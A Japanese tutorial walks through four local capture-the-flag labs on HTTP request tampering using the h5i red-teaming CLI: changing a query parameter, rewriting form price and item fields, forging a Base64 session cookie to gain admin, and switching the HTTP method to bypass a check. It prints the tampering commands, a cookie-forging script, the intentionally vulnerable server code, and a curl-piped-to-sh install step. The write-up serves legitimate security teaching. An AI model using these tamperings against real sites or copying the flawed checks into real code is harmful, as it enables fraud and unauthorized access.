---
title: CTF形式で徹底的に学ぶWeb Security ① -  HTTPリクエストの改ざん
tags: Security CTF Web AIエージェント ハッキング
author: Koukyosyumei
slide: false
---
コロンビア大学の博士課程でAI・システムセキュリティの研究をしている[Koukyosyumei](https://github.com/Koukyosyumei)です。この記事では、Web Securityの基本であるHTTP リクエストの改ざんを、CLIベースでレッドチーミングを行うためのツールである[h5i](https://h5i.dev/)を使いながら解説していきます。

## セットアップ

まだh5iをインストールしていない場合は、公式の手順に従ってバイナリをダウンロードしましょう。

```console
$ curl -fsSL https://h5i.dev/install.sh | sh -s -- --websec
```

次に、h5iのチュートリアル用レポジトリをクローンします。このレポジトリには、CTF形式のラボが格納されており、基本的にはサーバーやページの脆弱性を利用してフラグを見つけることがゴールです。

```console
$ git clone https://github.com/h5i-dev/h5i-tutorial.git
$ cd h5i-tutorial/websec
```

h5iのブラウザセッションは、内蔵エンジンではなく実際のChromiumを[agent-browser](https://www.npmjs.com/package/agent-browser)経由で起動し、その通信をh5iのキャプチャプロキシ越しに観測します。そのため、Node.jsをインストールしたうえで、次のコマンドでagent-browserを導入してください。

```console
$ npm install -g agent-browser && agent-browser install
```

Linuxのarm64環境などでは、agent-browserがChromiumを自動取得できないことがあります。その場合は、システムにインストール済みのChromiumのパスを環境変数で指定してください。

```console
$ export AGENT_BROWSER_EXECUTABLE_PATH=/path/to/chrome
```

## 課題 1: URLパラメータの編集

まずは最初の実験用ウェブサイトを立ち上げます。

```console
$ ./run.sh 01
```

`http://127.0.0.1:9010` にアクセスすると、以下のようなウェブサイトが確認できます。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/80ffd605-f4ab-4c4f-bf79-26c1ef053a96.png)

どうやら何らかのサービスの状態を確認するためのサイトのようです (おそらくAutomatic Certificate Management Environmentのことですが、ここでは重要ではありません)。

h5iのブラウザセッションを使うと、CLIからページを開いてその内容を確認することができます。まずは`browser open`でセッションを開始します。セッションを開くと、Chromiumが起動し、その通信がh5iのプロキシ越しに観測されることが表示されます。

```console
$ h5i browser open 'http://127.0.0.1:9010/' --session lab01 --new
✔  browser session lab01 (br_r8fzrz) on http://127.0.0.1:9010/
  url      : http://127.0.0.1:9010/
  placed   : on this machine, unconfined — agent-browser and Chromium run as ordinary host processes
  requests : proxy-observed (captured at h5i's proxy; the external browser itself is not confined)
  tls      : ignore-https-errors — Chromium accepts every certificate error for this session
  last     : target request captured 0s ago
  policy   : sha256:c496f6cb4eb0935ae5a593c0d1b8fae50cfb79dc1489cec210979ffe4d968d53
  next     : h5i browser snapshot   ·   h5i browser requests
```

ページ上の要素は、`browser snapshot`で一覧できます。各要素には`[ref=eN]`という識別子が付与され、あとでクリック対象などを指定するときに使えます。

```console
$ h5i browser snapshot --session lab01
- heading "Acme Status" [level=1, ref=e1]
- paragraph
  - StaticText "Live data: "
  - link "/api/status?level=public" [ref=e2]
```

次に、`/api/status?level=public`というリンクに飛んでみましょう。h5iの`websec requests`コマンドを使えば、これまでに実行したリクエストとそのレスポンスが一覧で表示されます。

```console
$ h5i browser navigate 'http://127.0.0.1:9010/api/status?level=public' --session lab01
✔  opened http://127.0.0.1:9010/api/status?level=public through session lab01 (br_r8fzrz)

$ h5i websec requests --session lab01
—          DENIED GET http://clients2.google.com/time/1/current?... — origin `http://clients2.google.com` is not in the allowlist
—          DENIED POST https://update.googleapis.com/service/update2/json?... — origin `https://update.googleapis.com` is not in the allowlist
req_3             GET http://127.0.0.1:9010/
res_3         200 GET http://127.0.0.1:9010/ (101 bytes, 1ms)
—          DENIED POST https://accounts.google.com/ListAccounts?... — origin `https://accounts.google.com` is not in the allowlist
req_7             GET http://127.0.0.1:9010/favicon.ico
res_7         404 GET http://127.0.0.1:9010/favicon.ico (46 bytes, 50ms)
req_11            GET http://127.0.0.1:9010/api/status?level=public
res_11        200 GET http://127.0.0.1:9010/api/status?level=public (155 bytes, 0ms)
```

セッションの実体は本物のChromiumなので、Googleの更新確認など、ページとは無関係なリクエストが裏で自動的に送信されます。これらはh5iのallowlistによって拒否され、`DENIED`として表示されます。そのため、リクエストidは`req_0`、`req_1`と連番にはならず、間が飛びます。目的のリクエストだけを絞り込みたいときは、`--url-contains`でパスの一部を指定すると便利です。

```console
$ h5i websec requests --session lab01 --url-contains /api/
req_11            GET http://127.0.0.1:9010/api/status?level=public
res_11        200 GET http://127.0.0.1:9010/api/status?level=public (155 bytes, 0ms)
```

今回は`/api/status`へのリクエストが`req_11`であることが分かりました。さらに、このリクエストとレスポンスの中身をのぞいてみましょう。

```console
$ h5i websec show req_11 --session lab01 --raw
GET /api/status?level=public HTTP/1.1
host: 127.0.0.1:9010
proxy-connection: keep-alive
sec-ch-ua: "Not:A-Brand";v="8", "Chromium";v="156"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
accept-language: en-US,en;q=0.9
upgrade-insecure-requests: 1
user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/156.0.0.0 Safari/537.36
accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/jxl,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
sec-fetch-site: none
sec-fetch-mode: navigate
sec-fetch-user: ?1
sec-fetch-dest: document
accept-encoding: gzip, deflate, br, zstd

$ h5i websec show res_11 --session lab01 --raw
HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:46:34 GMT
content-type: application/json
content-length: 155

{"level": "public", "levels": ["public", "internal"], "services": [{"service": "api", "state": "operational"}, {"service": "web", "state": "operational"}]}
```

ここでレスポンスに、`levels: ["public", "internal"]`という気になる項目があります。ためしに、HTTPリクエストの`level`を`internal`に書き換えて再送してみましょう。`websec replay`は、再送した結果のレスポンスをそのまま表示してくれます。

```console
$ h5i websec replay req_11 --session lab01 --set query.level=internal
res_13 ← req_13 · 200 · 264 bytes · 2 ms
sent  GET http://127.0.0.1:9010/api/status?level=internal
set   query.level=internal (was public)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:46:40 GMT
content-type: application/json
content-length: 264

{"level": "internal", "levels": ["public", "internal"], "services": [{"service": "api", "state": "operational", "note": "rate limiter disabled for the demo tenant"}, {"service": "vault", "state": "degraded", "note": "root token rotated to FLAG{query_tampering}"}]}
```

最後に、元の`res_11`と再送後の`res_13`で違いが生じたかを確認しましょう。

```console
$ h5i websec diff res_11 res_13 --session lab01
  status   : 200 → 200
  bytes    : 155 → 264 (+109)
  alike    : 0.300
  ~ header : content-length
  ~ level : public → internal
  ~ services.0.note : (absent) → rate limiter disabled for the demo tenant
  ~ services.1.note : (absent) → root token rotated to FLAG{query_tampering}
  ~ services.1.service : web → vault
  ~ services.1.state : operational → degraded
```

無事FLAGを取ることができました！！

ちなみに、このAPIは以下のように実装されており、リクエストのフィールドの値を使ってPublixかInternalを判定するという脆弱な作りになっていました。

```python
@app.get("/api/status")
def status(req):
    level = req.query.get("level", "public")
    rows = INTERNAL if level == "internal" else PUBLIC
    return js({"level": level, "levels": ["public", "internal"], "services": rows})
```

## 課題 2: 

では、次の課題に移りましょう。

```console
$ ./run.sh 02
```

ショップサイトのようですね。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/a1f0d5d0-f6b7-4974-a46f-d5f385b0bb85.png)

前回同様に、CLIからサイトをブラウズしてみます。`browser open`のあと、`browser snapshot`でページ上の要素を確認します。

```console
$ h5i browser open 'http://127.0.0.1:9020/' --session lab02 --new
$ h5i browser snapshot --session lab02
- heading "Curio Shop" [level=1, ref=e1]
- paragraph
  - StaticText "Balance: 20 credits"
- form
  - button "mug — 9 credits" [ref=e2]
- form
  - button "poster — 15 credits" [ref=e3]
```

このページには購入ボタンが二つあり、それぞれ`e2` (マグカップ)や`e3` (ポスター)といった識別子がついています。

次に、`e3` (ポスターの購入ボタン)を押して何が起こるかを観測してみましょう。クリックしたあと、`/buy`へのリクエストを`--url-contains`で絞り込んでidを確認します。

```console
$ h5i browser click @e3 --session lab02
✓ Done

$ h5i websec requests --session lab02 --url-contains /buy
req_12            POST http://127.0.0.1:9020/buy
res_12        200 POST http://127.0.0.1:9020/buy (51 bytes, 3ms)
```

ポスターの購入は`req_12`でした。このリクエストの中身を見てみましょう。

```console
$ h5i websec show req_12 --session lab02
req_12 · 2026-11-21T12:47:03.267170Z
POST /buy HTTP/1.1
host: 127.0.0.1:9020
content-length: 26
cache-control: max-age=0
content-type: application/x-www-form-urlencoded
user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/156.0.0.0 Safari/537.36
origin: http://127.0.0.1:9020
referer: http://127.0.0.1:9020/
accept-encoding: gzip, deflate, br, zstd

item=poster&price=15&qty=1
```

`POST`は主にデータを提出する際に使われるHTTPのメソッドで、ここでは、`item=poster&price=15&qty=1` というデータを送信していることが分かります。なお、`&`は各フィールドを区切るために使われます。

次に、価格を変更した場合に何が起きるか試してみましょう。`form.price`を0に書き換えて再送します。

```console
$ h5i websec replay req_12 --session lab02 --set form.price=0
res_13 ← req_13 · 200 · 50 bytes · 2 ms
sent  POST http://127.0.0.1:9020/buy
set   form.price=0 (was 15)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:05 GMT
content-type: application/json
content-length: 50

{"item": "poster", "paid": 0, "status": "shipped"}
```

価格がゼロのまま、購入が完了してしまいました。これは、POSTメソッドにおいて、価格をサーバー側でなくユーザーから送られてきたリクエストの値を使って計算しているためです。

リクエストのフィールドは自由に書き換えられるので、`item`も好きな値に変えられます。実はこのショップのカタログには、ボタンとしては表示されていない`vault-key`という高額な隠し商品があります。`item`と`price`の両方を書き換えて、この隠し商品を0クレジットで購入してみましょう。

```console
$ h5i websec replay req_12 --session lab02 --set form.item=vault-key --set form.price=0
res_15 ← req_15 · 200 · 93 bytes · 83 ms
sent  POST http://127.0.0.1:9020/buy
set   form.item=vault-key (was poster)
set   form.price=0 (was 15)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:25 GMT
content-type: application/json
content-length: 93

{"item": "vault-key", "paid": 0, "status": "shipped", "engraving": "FLAG{hidden_form_field}"}
```

隠し商品を0クレジットで手に入れ、フラグを取ることができました。サーバーは、価格も商品名もすべてリクエストの値をそのまま信じてしまっているのです。

```python
@app.post("/buy")
def buy(req):
    form = req.form
    item = form.get("item", "")
    # The bug: `price` and `qty` are read from the request. The catalogue is
    # right there in the same process and is never consulted.
    try:
        total = int(form.get("price", "0")) * int(form.get("qty", "1"))
    except ValueError:
        return js({"error": "bad number"}, 400)
    ...
    receipt = {"item": item, "paid": total, "status": "shipped"}
    if item == "vault-key":
        receipt["engraving"] = FLAG
    return js(receipt)
```

## 課題 3: クッキーの偽造

クッキーとは、ブラウザに格納された名前と値のペアのことで、サーバー側が`Set-Cookie`というフラグをレスポンスのヘッダーに加えることで、ブラウザが自動的に作成します。クッキーは、典型的にはセッションの状態の管理や、ユーザーの識別などに使われます。例えば、`Set-Cookie: session=abc123; Path=/`という指示がサーバーから贈られると、`Cookie: session=abc123`というクッキーがブラウザ内に保存されます。

このラボでは、ユーザーのブラウザから送信されたクッキーの取り扱いに脆弱性があるシステムを攻撃します。

```console
$ ./run.sh 03
```

まずは`/login`を開き、ログイン時のレスポンスを確認します。`--url-contains`で`/login`のリクエストを絞り込んでidを調べます。

```console
$ h5i browser open 'http://127.0.0.1:9030/login' --session lab03 --new
$ h5i websec requests --session lab03 --url-contains /login
req_3             GET http://127.0.0.1:9030/login
res_3         200 GET http://127.0.0.1:9030/login (27 bytes, 10ms)

$ h5i websec show res_3 --session lab03 --raw
HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:34 GMT
content-type: application/json
set-cookie: session=eyJ1c2VyIjogImd1ZXN0IiwgInJvbGUiOiAiYWdlbnQiLCAidGVuYW50IjogImFjbWUifQ; Path=/
content-length: 27

{"ok": true, "as": "guest"}
```

クッキーの値は何らかの方法によってエンコーディングされた値のようです。適当なデコーディングサイト (https://dencode.com/en/など) にコピペして確認してみましょう。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/e9f4073d-8f06-461b-8d2e-64f3619c34bf.png)

どうやら、Base64で`{"user": "guest", "role": "agent", "tenant": "acme"}`をエンコーディングしただけのようです。

次に、`/admin`ページに侵入できるかどうか試してみましょう。

```console
$ h5i browser navigate 'http://127.0.0.1:9030/admin' --session lab03
✔  opened http://127.0.0.1:9030/admin through session lab03 (br_191zft)

$ h5i websec requests --session lab03 --url-contains /admin
req_11            GET http://127.0.0.1:9030/admin
res_11        403 GET http://127.0.0.1:9030/admin (57 bytes, 0ms)

$ h5i websec show res_11 --session lab03 --raw
HTTP/1.1 403
server: miniweb
date: Sat, 21 Nov 2026 12:47:37 GMT
content-type: application/json
content-length: 57

{"error": "agents cannot see this", "your_role": "agent"}
```

サーバーから拒否されてしまいました。そこで、クッキーを偽装することを試みてみます。`role`を`admin`に書き換えたクレームをBase64でエンコードし、`cookie.session`として再送します。

```console
$ export FORGED=$(python3 - <<'PY'
import base64
import json

claims = {"user": "guest", "role": "admin", "tenant": "acme"}
token = base64.urlsafe_b64encode(json.dumps(claims).encode())
print(token.decode().rstrip("="))
PY
)
$ h5i websec replay req_11 --session lab03 --set "cookie.session=$FORGED"
res_13 ← req_13 · 200 · 53 bytes · 3 ms
sent  GET http://127.0.0.1:9030/admin
set   cookie.session=eyJ1c2VyIjogImd1ZXN0IiwgInJvbGUiOiAiYWRtaW4iLCAidGVuYW50IjogImFjbWUifQ (was eyJ1c2VyIjogImd1ZXN0IiwgInJvbGUiOiAiYWdlbnQiLCAidGVuYW50IjogImFjbWUifQ)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:41 GMT
content-type: application/json
content-length: 53

{"panel": "admin", "master_key": "FLAG{cookie_role}"}
```

無事侵入が成功し、フラグを取ることができました。

この攻撃の成功理由は、ユーザーから送信されたクッキーの値をそのまま信じてしまっているためです。

```python
claims = unseal(req.cookies.get("session", "")) or {}
if claims.get("role") != "admin":
    return js({"error": "agents cannot see this", "your_role": claims.get("role")}, 403)
return js({"panel": "admin", "master_key": FLAG})
```

## 課題 4: HTTPメソッドを変えてみる。

また、ユーザー側はHTTPメソッドを任意のものに変更してリクエストを送信することができますが、メソッドの管理が甘いサイトだと、このメソッド変更だけで侵入できる場合があります。

```console
$ ./run.sh 04
```

なんらかのPayrollサイトのようですね。

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2959953/01eda7a2-5def-4b6f-9d87-e012ae24b721.png)

制限されていると表示されてる`/admin/payslips`にアクセスすると、403で拒否されてしまいました。

```console
$ h5i browser open 'http://127.0.0.1:9040/admin/payslips' \
  --session lab04 --new
$ h5i websec requests --session lab04 --url-contains /admin/payslips
req_3             GET http://127.0.0.1:9040/admin/payslips
res_3         403 GET http://127.0.0.1:9040/admin/payslips (49 bytes, 6ms)

$ h5i websec show res_3 --session lab04 --raw
HTTP/1.1 403
server: miniweb
date: Sat, 21 Nov 2026 12:47:49 GMT
content-type: application/json
content-length: 49

{"error": "admins only", "method_checked": "GET"}
```

ここで、別のメソッドを試してみましょう。`method=PUT`を指定して再送します。

```console
$ h5i websec replay req_3 --session lab04 --set method=PUT
res_11 ← req_11 · 200 · 56 bytes · 3 ms
sent  PUT http://127.0.0.1:9040/admin/payslips
set   method=PUT (was GET)

HTTP/1.1 200
server: miniweb
date: Sat, 21 Nov 2026 12:47:52 GMT
content-type: application/json
content-length: 56

{"payslips": 412, "signing_key": "FLAG{verb_tampering}"}
```

侵入できてしまいました！

これは、adminかどうかの判定ロジックが、メソッドが`GET`か`POST`ではない場合に、常にTrueを返すようになっていたたです。

```python
# Simplified from the lab's permission check.
if method in ("GET", "POST") and path.startswith("/admin/"):
    return role == "admin"
return True
```

## まとめ

最後にセッションを片付けておきましょう。

```console
$ h5i browser close --session lab01
$ h5i browser close --session lab02
$ h5i browser close --session lab03
$ h5i browser close --session lab04
```

この記事では、h5iを用いてHTTPリクエストの改ざんを行う方法を解説しました。近年はAIによってコードを書く場面が飛躍的に増えましたが、その分セキュリティにも十分を気を付けなければいけません。h5iはCLIベースのレッドチーミングツールとして最近注目を集めており、Claude CodeやCodexといったエージェントにデモ攻撃を行わせたり、CI/CD上で疑似攻撃を行い、きちんと防御できているかを試すといったことを簡単に行うことができます。

**参考**

https://h5i.dev/

https://github.com/h5i-dev/h5i

https://medium.com/@Koukyosyumei/web-security-tutorial-with-h5i-part-1-http-request-tampering-39c4a0857b85

https://qiita.com/Koukyosyumei/items/ef83e0a3399312203c77




















